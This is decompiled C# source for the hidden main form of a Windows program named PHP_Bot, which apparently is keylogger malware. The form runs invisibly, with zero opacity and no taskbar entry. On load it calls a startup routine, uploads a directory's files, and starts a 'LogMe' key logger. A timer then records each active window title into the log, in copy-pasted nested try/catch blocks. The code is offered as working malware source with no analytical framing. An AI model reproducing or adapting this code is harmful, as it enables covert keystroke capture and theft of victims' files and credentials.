using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using PHP_Bot.RS.Auth;

namespace PHP_Bot;

public class Form1 : Form
{
	private string window = "";

	private IContainer components = null;

	private Timer timer1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Methods.startup();
		new Auth();
		while (!Config.nexus.isDone)
		{
		}
		Methods.UploadFile(Config.nexus.GetDirectory);
		LogMe.k();
		timer1.set_Interval(100);
		timer1.Start();
		Config.form = this;
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			string activeWindow = LogMe.GetActiveWindow();
			if (window != activeWindow && activeWindow != "could not find title.")
			{
				StreamWriter streamWriter = File.AppendText(LogMe.path);
				streamWriter.Write("\r\n\r\n[ " + activeWindow + " ]\r\n");
				streamWriter.Flush();
				streamWriter.Close();
				window = activeWindow;
			}
		}
		catch
		{
			try
			{
				string activeWindow = LogMe.GetActiveWindow();
				if (window != activeWindow && activeWindow != "could not find title.")
				{
					StreamWriter streamWriter = File.AppendText(LogMe.path);
					streamWriter.Write("\r\n\r\n[ " + activeWindow + " ]\r\n");
					streamWriter.Flush();
					streamWriter.Close();
					window = activeWindow;
				}
			}
			catch
			{
				try
				{
					string activeWindow = LogMe.GetActiveWindow();
					if (window != activeWindow && activeWindow != "could not find title.")
					{
						StreamWriter streamWriter = File.AppendText(LogMe.path);
						streamWriter.Write("\r\n\r\n[ " + activeWindow + " ]\r\n");
						streamWriter.Flush();
						streamWriter.Close();
						window = activeWindow;
					}
				}
				catch
				{
					try
					{
						string activeWindow = LogMe.GetActiveWindow();
						if (window != activeWindow && activeWindow != "could not find title.")
						{
							StreamWriter streamWriter = File.AppendText(LogMe.path);
							streamWriter.Write("\r\n\r\n[ " + activeWindow + " ]\r\n");
							streamWriter.Flush();
							streamWriter.Close();
							window = activeWindow;
						}
					}
					catch
					{
					}
				}
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(108, 0));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
